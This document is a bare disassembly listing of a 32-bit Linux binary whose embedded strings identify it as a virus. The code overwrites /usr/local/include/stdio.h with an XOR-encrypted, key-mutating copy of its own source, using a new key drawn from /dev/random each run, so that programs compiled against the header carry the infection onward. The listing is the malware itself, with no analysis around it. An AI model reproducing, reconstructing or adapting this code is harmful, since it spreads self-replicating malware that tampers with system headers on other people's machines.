xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._2
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
call sym.virfunc
mov eax, dword [arg_8h]
push eax
call sym.Close
add esp, 4
mov edx, eax
mov eax, edx
jmp 0x8048658
mov esi, esi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push esi
push ebx
mov dword [var_8h], 0
mov dword [var_ch], 1
mov dword [var_10h], 0
cmp dword [obj.first.14], 0
je 0x80486d4
xor eax, eax
jmp 0x8048904
lea esi, [esi]
push 0
call sym.imp.umask
add esp, 4
mov dword [var_10h], eax
push 0xa67
push obj.C
call sym.Crypt
add esp, 8
push 0x1ed
push str._usr_local_include
call sym.imp.mkdir
add esp, 8
push str._usr_local_include_stdio.h
call sym.imp.unlink
add esp, 4
push 0x8048aee
push 0x1a4
push 0x42
push str._usr_local_include_stdio.h
call sym.imp.open
add esp, 0xc
mov dword [stream], eax
mov eax, dword [stream]
push eax
call sym.imp.fdopen
add esp, 8
mov dword [stream], eax
mov esi, dword [stream]
mov dword [var_4h], esi
cmp dword [var_4h], 0
jne 0x8048756
push str.fopen
call sym.imp.perror
add esp, 4
push 0xa67
push str.include___usr_include_stdio.h__ninclude__fcntl.h__ninclude__linux_unistd.h__ninclude__sys_stat.h__ninclude__unistd.h__ninclude__errno.h__ninclude__string.h__ndefine_CHARS__d_n_nint_virfunc_void___nint_Close_int___nint_mutate_char___nint_Crypt_char__int___n_nchar_C_____n_
mov eax, dword [var_4h]
mov dword [stream], eax
mov esi, dword [stream]
push esi
call sym.imp.fprintf
add esp, 0xc
push obj.key
call sym.mutate
add esp, 4
push 0xa67
push obj.C
call sym.Crypt
add esp, 8
mov dword [var_8h], 0
cmp dword [var_8h], 0xa66
jle 0x80487a8
jmp 0x804883c
mov esi, esi
mov eax, dword [var_ch]
mov dword [stream], eax
mov ecx, 0x88888889
mov eax, dword [stream]
imul ecx
mov esi, dword [stream]
lea ecx, [esi + edx]
mov edx, ecx
sar edx, 3
mov ecx, dword [stream]
sar ecx, 0x1f
sub edx, ecx
mov ebx, edx
mov ecx, ebx
shl ecx, 4
sub ecx, edx
mov eax, dword [stream]
sub eax, ecx
mov dword [stream], eax
cmp dword [stream], 0
jne 0x8048800
push 0x8048c0c
mov esi, dword [var_4h]
mov dword [stream], esi
mov eax, dword [stream]
push eax
call sym.imp.fprintf
add esp, 8
mov dword [var_ch], 0
mov dword [stream], obj.C
mov edx, dword [var_8h]
mov esi, dword [stream]
movzx eax, byte [edx + esi]
mov dword [stream], eax
mov eax, dword [stream]
push eax
push str.x_02x
mov esi, dword [var_4h]
mov dword [stream], esi
mov eax, dword [stream]
push eax
call sym.imp.fprintf
add esp, 0xc
inc dword [var_ch]
inc dword [var_8h]
jmp 0x8048798
mov esi, esi
push str.___n_n
mov esi, dword [var_4h]
mov dword [stream], esi
mov eax, dword [stream]
push eax
call sym.imp.fprintf
add esp, 8
movzx eax, byte [0x804a7eb]
mov dword [stream], eax
mov eax, dword [stream]
push eax
movzx eax, byte [0x804a7ea]
mov dword [stream], eax
mov eax, dword [stream]
push eax
movzx eax, byte [0x804a7e9]
mov dword [stream], eax
mov eax, dword [stream]
push eax
movzx eax, byte [obj.key]
mov dword [stream], eax
mov eax, dword [stream]
push eax
push str._n_nunsigned_char_key_4___0x_02x__0x_02x__0x_02x__0x_02x__n_n
mov esi, dword [var_4h]
mov dword [stream], esi
mov eax, dword [stream]
push eax
call sym.imp.fprintf
add esp, 0x18
push 0xa67
push obj.C
call sym.Crypt
add esp, 8
push obj.C
push 0x8048c5d
mov esi, dword [var_4h]
mov dword [stream], esi
mov eax, dword [stream]
push eax
call sym.imp.fprintf
add esp, 0xc
mov esi, dword [var_4h]
mov dword [stream], esi
mov eax, dword [stream]
push eax
call sym.imp.fclose
add esp, 4
mov dword [obj.first.14], 1
mov esi, dword [var_10h]
mov dword [stream], esi
mov eax, dword [stream]
push eax
call sym.imp.umask
add esp, 4
xor eax, eax
jmp 0x8048904
mov esi, esi
lea esp, [var_1ch]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
push ebx
mov eax, 6
mov ebx, dword [arg_8h]
int 0x80
mov dword [var_4h], eax
cmp dword [var_4h], 0
jl 0x8048680
mov edx, dword [var_4h]
mov eax, edx
jmp 0x804869c
lea esi, [esi]
call sym.imp.__errno_location
mov dword [var_8h], eax
mov edx, dword [var_8h]
mov eax, dword [var_4h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x804869c
lea esi, [esi]
mov ebx, dword [var_ch]
leave
ret
push ebp
mov ebp, esp
cmp dword [obj.completed.3], 0
jne 0x8048608
jmp 0x80485e1
mov esi, esi
lea edx, [eax + 4]
mov dword [obj.p.2], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.2]
cmp dword [eax], 0
jne 0x80485d4
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x80485fe
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.3], 1
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x804862f
push obj.object.8
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x8048a5c
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8048a50
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
sub esp, 8
nop
mov dword [var_8h], 0
mov esi, esi
cmp dword [var_8h], 3
jle 0x80489b0
jmp 0x8048a10
push 0
push str._dev_random
call sym.imp.open
add esp, 8
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0
jg 0x80489e8
push str.open
call sym.imp.perror
add esp, 4
call sym.imp.__errno_location
mov eax, eax
mov edx, eax
mov ecx, dword [edx]
mov eax, ecx
jmp 0x8048a14
mov esi, esi
push 1
mov eax, dword [buf]
mov edx, dword [var_8h]
add eax, edx
push eax
mov eax, dword [fildes]
push eax
call sym.imp.read
add esp, 0xc
mov eax, dword [fildes]
push eax
call sym.Close
add esp, 4
inc dword [var_8h]
jmp 0x80489a8
xor eax, eax
jmp 0x8048a14
leave
ret
push ebp
mov ebp, esp
push ebx
call 0x8048489
pop ebx
add ebx, 0x237b
cmp dword [ebx + 0x44], 0
je 0x804849e
call loc.imp.__gmon_start__
mov esi, esi
call sym.frame_dummy
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push str.Cool__Started._Now_you_should_have_e_new_stdio.h_nin__usr_local_include_directory._n_n_nThis_virus_is_dedicated_to_Doreen._nHope_ill_see_her_again._:__n_n
call sym.imp.printf
add esp, 4
push 0xfffffffffffffff5
call sym.close
add esp, 4
mov edx, eax
mov eax, edx
jmp 0x8048a38
leave
ret
jmp dword [reloc.printf]
push ebp
mov ebp, esp
sub esp, 0xc
push esi
push ebx
mov dword [var_4h], 0
mov dword [var_8h], 0
mov dword [var_4h], 0
lea esi, [esi]
mov eax, dword [var_4h]
cmp eax, dword [arg_ch]
jl 0x8048938
jmp 0x804898c
mov esi, esi
mov eax, dword [arg_8h]
mov edx, dword [var_4h]
add eax, edx
mov edx, dword [arg_8h]
mov ecx, dword [var_4h]
add edx, ecx
mov ecx, dword [var_8h]
mov dword [var_ch], obj.key
mov bl, byte [edx]
mov esi, dword [var_ch]
xor bl, byte [ecx + esi]
mov byte [eax], bl
mov eax, dword [var_8h]
inc eax
mov edx, eax
test edx, edx
jge 0x8048969
add edx, 3
mov ebx, edx
sar ebx, 2
mov dword [var_8h], ebx
mov edx, dword [var_8h]
mov ecx, edx
lea edx, [ecx*4]
mov esi, eax
sub esi, edx
mov dword [var_8h], esi
inc dword [var_4h]
jmp 0x804892c
lea esi, [esi]
xor eax, eax
jmp 0x8048990
lea esp, [var_14h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push ebx
call 0x8048a75
pop ebx
add ebx, 0x1d8f
call loc.gcc2_compiled.
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.fdopen]
jmp dword [reloc.perror]
jmp dword [reloc.fprintf]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.umask]
jmp dword [reloc.read]
jmp dword [reloc.unlink]
jmp dword [reloc.fclose]
jmp dword [reloc.__errno_location]
jmp dword [reloc.open]
jmp dword [reloc.mkdir]
